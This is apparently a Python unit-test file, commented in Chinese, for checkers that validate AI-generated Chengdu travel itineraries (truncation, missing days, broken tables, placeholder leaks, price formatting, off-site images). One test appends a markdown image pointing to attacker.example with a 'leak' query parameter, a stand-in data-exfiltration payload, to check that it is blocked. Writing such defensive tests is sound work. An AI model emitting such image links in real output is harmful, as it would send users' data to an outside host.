"""评估集检查器单测（2026-08-04）。

每个用例的「阳性样本」都取自**本周线上真实翻车的形态**——检查器的价值在于
下次同样的东西再出现能被自动拦住，所以样本必须来自真实事故而非臆想。
"""

import pathlib

from evals.checks import (
    Query, check_basics, check_broken_table, check_days, check_destination,
    check_foreign_image, check_forbidden, check_internal_jargon, check_placeholder_leak,
    check_raw_bold, check_swallowed_price, check_truncated, run_checks,
)

GOOD = """# 成都3日老街小吃漫游

> **行程速览**：三天专注老街区烟火气与地道小吃。

## Day 1 城南绿洲

| 时段 | 地点与体验 | 参考花费 |
| --- | --- | --- |
| 上午 | 铁像寺水街喝盖碗茶 | 30-40元 |
| 下午 | 锦城公园散步 | 免费 |

## Day 2 烟火人间

| 时段 | 地点 | 花费 |
| --- | --- | --- |
| 上午 | 文殊院 | 免费 |

## Day 3 都市松弛

住宿参考每晚 ¥400~600。

## 参考来源
- 小红书｜成都攻略
"""


def _q(**kw):
    return Query(id="t", text="x", **kw)


# ---------- 截断（2026-08-04） ----------

def test_truncated_detects_warning_banner():
    bad = GOOD + "\n\n> ⚠️ 攻略较长，本次生成触及长度上限已截断。"
    assert any(f.code == "truncated" for f in check_truncated(bad))


def test_truncated_detects_half_sentence_ending():
    """线上原样：被从「**人均（含」切断。"""
    assert any(f.code == "truncated" for f in check_truncated("正文正文\n\n**人均（含"))


def test_truncated_clean_on_normal_ending():
    """正文以列表项/中文句子收尾是正常的，不能误报（检查器第一版在这里翻过车）。"""
    assert check_truncated(GOOD) == []
    assert check_truncated("……最后一天返程，行程结束。") == []
    assert check_truncated("## 参考来源\n- 小红书｜成都攻略") == []


def test_truncated_detects_cut_table_row():
    assert any(f.code == "truncated" for f in check_truncated("| 傍晚 | 锦城公园：闹中"))


# ---------- 天数 ----------

def test_days_missing():
    findings = check_days(GOOD, 5)
    assert findings and "Day 4、5" in findings[0].detail


def test_days_complete():
    assert check_days(GOOD, 3) == []
    assert check_days(GOOD, 0) == []


# ---------- 表格被劈开（2026-07-30） ----------

def test_broken_table_detected():
    """兜底插图插进表格行之间 → 后续行退化成裸文本。"""
    bad = GOOD.replace(
        "| 下午 | 锦城公园散步 | 免费 |",
        "\n![图](/travel/api/img?u=x)\n\n| 傍晚 | 锦城公园：闹中取静 | 免费 |",
    )
    assert any(f.code == "broken_table" for f in check_broken_table(bad))


def test_broken_table_clean_on_normal_tables():
    assert check_broken_table(GOOD) == []


# ---------- 占位符泄漏（2026-07-30） ----------

def test_placeholder_leak():
    bad = GOOD + "\n[img:小红书灵感·📍成都可以分成3个板块游玩，不绕路✔️·2]"
    assert any(f.code == "img_placeholder_leak" for f in check_placeholder_leak(bad))
    assert check_placeholder_leak(GOOD) == []


# ---------- 裸星号（CJK 标点紧邻，2026-07-30） ----------

def test_raw_bold_marker_flags_unclosed_asterisks():
    """真正的硬伤形态：`**` 没闭合，前端补零宽空格也救不回来，会原样显示。"""
    bad = "住宿预算：**人均（含"
    assert any(f.code == "raw_bold_marker" for f in check_raw_bold(bad))


def test_raw_bold_marker_flags_cross_line_bold():
    """跨行的 `**` prepareMarkdown 的 `[^*\\n]` 匹配不到，同样修不掉。"""
    bad = "推荐理由：**很值得\n去一趟**，别错过"
    assert any(f.code == "raw_bold_marker" for f in check_raw_bold(bad))


def test_raw_bold_clean_on_cjk_adjacent_paired_bold():
    """回归 2026-08-04 误报：配对完好的加粗即便紧邻中文标点也**不是**硬伤。

    三个渲染入口都会先过 prepareMarkdown() 补零宽空格，用户看到的是正常加粗。
    这条样本与 frontend/tests/interaction-utils.test.mjs 里断言「会被修好」的是同一个串——
    两边曾经对同一个字符串给出相反结论，线上三条攻略因此 0/3 全红。
    """
    assert check_raw_bold("乘地铁前往春熙路，**烤匠麻辣烤鱼（春熙路店）**解决午餐") == []
    assert check_raw_bold("；**巴公房子**：复古红砖公寓，出片率高") == []
    assert check_raw_bold("均为**参考价（非实时）**，动车时刻暂无法查询") == []


def test_raw_bold_clean_on_normal_bold():
    assert check_raw_bold("这里是 **重点内容** 正常加粗") == []
    assert check_raw_bold(GOOD) == []


# ---------- 价格区间被删除线吞掉（2026-07-30） ----------

def test_swallowed_price_range():
    bad = "经济型 ¥400600/晚，中档 ¥600900/晚"
    assert any(f.code == "swallowed_price_range" for f in check_swallowed_price(bad))


def test_swallowed_price_clean():
    assert check_swallowed_price(GOOD) == []
    assert check_swallowed_price("总计 ¥1,200 / 人均 ¥600") == []  # 千分位不算


# ---------- 目的地 / 禁词 ----------

def test_destination_missing():
    findings = check_destination(GOOD, ["成都", "重庆"])
    assert findings and "重庆" in findings[0].detail
    assert check_destination(GOOD, ["成都"]) == []


def test_forbidden_holiday_is_memory_pollution():
    """用户没提节假日，正文却写「国庆期间大概率不堵」——旧行程记忆泄漏。"""
    findings = check_forbidden("国庆期间大概率不堵", ["国庆", "春节"])
    assert findings and findings[0].code == "unrequested_holiday"


def test_internal_jargon():
    bad = "因本轮参考资料中不含携程实时酒店列表，无法提供具体酒店名称"
    assert any(f.code == "internal_jargon" for f in check_internal_jargon(bad))
    assert check_internal_jargon(GOOD) == []


# ---------- 站外图片（Phase 69 外带防护） ----------

def test_foreign_image_blocked():
    bad = GOOD + "\n![x](https://attacker.example/p.png?d=leak)"
    assert any(f.code == "foreign_image" for f in check_foreign_image(bad))


def test_proxied_image_ok():
    assert check_foreign_image(GOOD + "\n![x](/travel/api/img?u=abc)") == []


# ---------- 基本项与汇总 ----------

def test_basics():
    assert any(f.code == "too_short" for f in check_basics("太短了"))
    assert any(f.code == "no_sources" for f in check_basics("正" * 700))


def test_run_checks_passes_clean_guide():
    q = _q(cities=["成都"], min_days=3)
    assert [f for f in run_checks(GOOD + "正" * 700, q) if f.level == "error"] == []


def test_run_checks_catches_stacked_problems():
    bad = (GOOD.replace("## Day 3 都市松弛", "")
           + "\n[img:泄漏]\n经济型 ¥400600/晚\n> ⚠️ 已截断")
    codes = {f.code for f in run_checks(bad, _q(cities=["成都"], min_days=3))}
    assert {"missing_days", "img_placeholder_leak", "swallowed_price_range", "truncated"} <= codes


# ---------- 评估集本身的完整性 ----------

def test_queries_yaml_loads_and_is_well_formed():
    from evals.runner import load_queries

    qs = load_queries(pathlib.Path(__file__).parent.parent / "evals" / "queries.yaml")
    assert len(qs) >= 10
    assert len({q.id for q in qs}) == len(qs)  # id 唯一
    assert all(q.text and q.note for q in qs)  # 每条都要写清楚守什么
    assert {"single", "multi", "waypoint", "hotel", "memory"} <= {q.category for q in qs}
